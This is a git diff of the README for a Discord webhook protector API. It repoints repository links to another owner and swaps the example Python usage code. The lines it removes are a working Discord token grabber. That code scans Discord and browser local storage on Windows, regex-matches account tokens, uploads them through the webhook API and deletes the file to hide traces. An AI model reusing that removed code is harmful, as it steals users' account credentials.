@@ -6,16 +6,16 @@
 
 <p align="center"> 
   <kbd>
-<img src="https://raw.githubusercontent.com/Rdimo/images/master/Discord-Webhook-Protector/Discord-Webhook-Protector.png"></img>
+<img src="https://github.com/user-attachments/assets/2fd4aa5e-0dd7-463c-b44a-b7946a8b2bba"></img>
   </kbd>
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/github/languages/top/Rdimo/Discord-Webhook-Protector?style=flat-square"/>
-  <img src="https://img.shields.io/github/last-commit/Rdimo/Discord-Webhook-Protector?style=flat-square"/>
+  <img src="https://img.shields.io/github/languages/top/Rasmus257/discord-webhook-protector?style=flat-square"/>
+  <img src="https://img.shields.io/github/last-commit/Rasmus257/discord-webhook-protector?style=flat-square"/>
   <img src="https://sonarcloud.io/api/project_badges/measure?project=Rdimo_Discord-Webhook-Protector&metric=ncloc"/>
-  <img src="https://img.shields.io/github/stars/Rdimo/Discord-Webhook-Protector?color=444444&label=Stars&style=flat-square"/>
-  <img src="https://img.shields.io/github/forks/Rdimo/Discord-Webhook-Protector?color=444444&label=Forks&style=flat-square"/>
+  <img src="https://img.shields.io/github/stars/Rasmus257/discord-webhook-protector?color=444444&label=Stars&style=flat-square"/>
+  <img src="https://img.shields.io/github/forks/Rasmus257/discord-webhook-protector?color=444444&label=Forks&style=flat-square"/>
 </p>
 
 
@@ -32,7 +32,6 @@ Love ❌ code ✅
 ## <a id="content"></a> ℹ️ 〢 Content
 
 - [🔰・Features](#features)
-- [🌌・Discord](https://cheataway.com)
 - [🎉・Setup the Api with Heroku](#heroku)
 - [🎉・Setup the Api with Render](#render)
 - [🧪・Testing the Api](#testing)
@@ -58,7 +57,7 @@ Love ❌ code ✅
 
 1. Create an account on [Heroku.com](https://heroku.com) (Yes all of this is **free**)
 2. Install [nodejs](https://nodejs.org/en/), [heroku cli](https://devcenter.heroku.com/articles/getting-started-with-nodejs#set-up), and [git](https://git-scm.com/)
-3. Open [config.json](https://github.com/Rdimo/Discord-Webhook-Protector/blob/main/config.json) and put in your webhook at the top
+3. Open [config.json](https://github.com/Rasmus257/discord-webhook-protector/blob/main/config.json) and put in your webhook at the top
 4. Now you need a key, open cmd in the directory and type the following ⇣
 ```sh-session
 $ cd test
@@ -66,7 +65,7 @@ $ py keyGen.py
 >>> Your key is: ...
 >>> Copied key to clipboard!
 ```
-5. Paste your generated key in [config.json](https://github.com/Rdimo/Discord-Webhook-Protector/blob/main/config.json)
+5. Paste your generated key in [config.json](https://github.com/Rasmus257/discord-webhook-protector/blob/main/config.json)
 6. Open a new cmd in the directory and type `npm i`
 7. Now follow these steps carefully ⇣
 
@@ -94,7 +93,7 @@ $ heroku domains
 ```sh
 $ first issue error: failed to push some refs to 'https://git.heroku.com/app-name.git'
 ```
-Then run `"git push heroku master"` instead | https://github.com/Rdimo/Discord-Webhook-Protector/issues/1
+Then run `"git push heroku master"` instead | https://github.com/Rasmus257/discord-webhook-protector/issues/1
 
 ㅤ
 
@@ -107,7 +106,7 @@ If any bugs occur please report them or try and see if restarting the app by typ
 ### <a id="render"></a>📁 〢 Hosting the API with Render
 
 1. Setup an account on [Render](https://dashboard.render.com/register)
-2. [Fork](https://github.com/Rdimo/Discord-Webhook-Protector/fork) This Repo **(Dont Forget to Make it Private And Edit the config.js File)**
+2. [Fork](https://github.com/Rasmus257/discord-webhook-protector/fork) This Repo **(Dont Forget to Make it Private And Edit the config.js File)**
 3. Go to [This](https://dashboard.render.com/select-repo?type=web) Link and connect your GitHub Account
 4. Select the repo you just made 
   ![image](https://user-images.githubusercontent.com/86944806/170194672-2a21aed0-cc1b-4efb-88d5-c835034c2e70.png)
@@ -177,7 +176,6 @@ The config and what the options do
 Example use of the api hosted on heroku
 
 ```py
-import os, re
 import requests
 from pyotp import TOTP
 
@@ -186,34 +184,12 @@ api = "https://your-heroku-app-name.herokuapp.com" #the name of your app will pr
 pass32 = 'K4ZVUQTSIRMDOWKRGU2WQQTZJM======' #needs to be same key as the one in your api
 key = TOTP(pass32).now()
 
-local = os.getenv('LOCALAPPDATA')
-roaming = os.getenv('APPDATA')
-_file = os.getenv('temp') + os.sep + 'tokens.txt'
+#send the text to webhook
+requests.post(api, headers={"Authorization": key}, data={"content": "Hello from webhook!"})
 
-paths = {
-    'Discord': roaming + '\\Discord\\Local Storage\\leveldb',
-    'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb',
-    'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb',
-    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
-    'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
-    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
-    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb'
-}
-for platform, path in paths.items():
-    if not os.path.exists(path):
-        continue
-    for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-            continue
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in re.findall(regex, line):
-                    with open(_file, 'a') as f:
-                        f.write(token)
-
-requests.post(api, headers={"Authorization": key}, data={"content": f'Successfully grabbed tokens from {os.getlogin()}:'}) #send the text to webhook
-requests.post(api, headers={"Authorization": key}, files={"upload_file": open(_file, 'rb')}) #send text file with tokens in it to the webhook
-os.remove(_file) #delete traces
+#send text file to webhook
+with open('file.txt', 'rb') as f:
+    requests.post(api, headers={"Authorization": key}, files={"upload_file": f})
 ```
 
 > Thank you [xrevix](https://github.com/xrevix) for bug testing and reporting all of them 😘
